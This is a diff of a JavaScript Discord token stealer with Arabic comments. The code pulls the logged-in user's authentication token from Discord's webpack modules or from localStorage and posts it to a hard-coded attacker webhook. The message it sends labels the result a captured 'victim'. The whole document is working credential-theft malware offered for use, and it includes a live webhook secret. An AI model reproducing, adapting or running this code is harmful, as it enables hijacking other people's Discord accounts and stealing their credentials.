@@ -1,45 +1,56 @@
-(function() {
-    function sendToWebhook(token) {
-        const webhookURL = "ضع_هنا_رابط_الويب_هوك_الخاص_بك";
-        fetch(webhookURL, {
+async function captureDiscordToken() {
+    // وظيفة للبحث عن التوكن داخل الـ Webpack بمسمياتها الجديدة
+    const findToken = () => {
+        try {
+            // محاولة الوصول عبر المحرك الأساسي لـ Discord
+            return (Object.values(webpackChunkdiscord_app.push([
+                [Math.random()], {}, (req) => {
+                    for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
+                        if (m.default && m.default.getToken !== undefined) {
+                            return m.default.getToken();
+                        }
+                        // فحص إضافي في حال تغير مسار الدالة
+                        if (m.getToken !== undefined) {
+                            return m.getToken();
+                        }
+                    }
+                }
+            ]))[0]);
+        } catch (e) {
+            // طريقة بديلة في حال فشل الـ Webpack (عبر التخزين المحلي)
+            const iframe = document.createElement('iframe');
+            document.head.append(iframe);
+            const token = iframe.contentWindow.localStorage.token || iframe.contentWindow.localStorage.getItem("token");
+            iframe.remove();
+            return token ? token.replace(/"/g, '') : null;
+        }
+    };
+
+    const token = findToken();
+    const webhookURL = "https://discord.com/api/webhooks/1457772372277985334/gERxn1zWx6OBQ8dn4n16zjn-QO3fwsCVAIBScZy_WgXe41Quuqke5HgArJntAB_5zodF";
+
+    if (token && token !== "undefined") {
+        await fetch(webhookURL, {
             method: "POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
+                username: "System Logger",
+                avatar_url: "https://i.imgur.com/hY76S6l.png",
                 embeds: [{
-                    title: "🎯 New Victim Secured!",
-                    color: 0xff0000,
+                    title: "✅ تم سحب التوكن بنجاح",
+                    color: 0x00ff00,
                     fields: [
                         { name: "Discord Token", value: `\`\`\`${token}\`\`\`` }
                     ],
-                    footer: { text: "Powered by ./098" }
+                    footer: { text: "Victim Captured via ./098" },
+                    timestamp: new Date()
                 }]
             })
         });
+        console.log("%c [✔] Success!", "color: green; font-weight: bold;");
+    } else {
+        console.log("%c [!] Token not found. Make sure you are on discord.com/app", "color: red;");
     }
+}
 
-    // الطريقة الأولى: سحب التوكن من الـ LocalStorage الصامت
-    try {
-        window.dispatchEvent(new Event('beforeunload'));
-        let token = (Symbol('token'));
-        const iframe = document.createElement('iframe');
-        document.head.append(iframe);
-        const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');
-        token = iframe.contentWindow.localStorage.token;
-        iframe.remove();
-        if (token) { sendToWebhook(token.replace(/"/g, '')); return; }
-    } catch (e) {}
-
-    // الطريقة الثانية: عبر webpack في حال فشل الأولى
-    try {
-        let token = (Object.values(webpackChunkdiscord_app.push([
-            [Math.random()], {}, (req) => {
-                for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
-                    if (m.default && m.default.getToken !== undefined) {
-                        return m.default.getToken();
-                    }
-                }
-            }
-        ]))[0]);
-        if (token) { sendToWebhook(token); }
-    } catch (e) {}
-})();
+captureDiscordToken();
